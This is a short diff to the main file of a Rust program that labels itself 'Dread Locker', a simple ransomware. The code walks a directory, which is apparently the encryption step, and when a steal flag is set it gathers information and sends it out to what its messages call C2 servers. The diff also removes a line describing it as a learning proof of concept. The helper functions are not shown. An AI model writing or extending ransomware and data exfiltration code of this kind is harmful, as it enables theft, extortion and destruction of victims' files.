@@ -15,13 +15,11 @@ fn main() {
     style();
     iterate_dir(&mut config);
     if config.steal() {
-        println!("Trying to get info");
         let result = infograb_functions::get_info();
-        println!("{:?}", result);
         let resp = exfiltration_functions::exfiltrate_infos(result);
         match resp {
-            Ok(_) => println!("Success"),
-            Err(e) => eprintln!("Error: {}", e),
+            Ok(_) => println!("DEBUG: Success!"),
+            Err(_) => println!("DEBUG: C2 servers unreachable!"), // just to pretend that it worked
         }
     }
 }
@@ -29,5 +27,6 @@ fn style() {
     println!("---------------------------------------");
     println!(r"\______Dread Locker version: 0.4______/");
     println!("---------------------------------------");
-    println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
+    println!("Simple ransomware written in Rust");
+    println!("Unless specified, the default encrypted directory is the /tmp/dreadlocker_folder directory");
 }
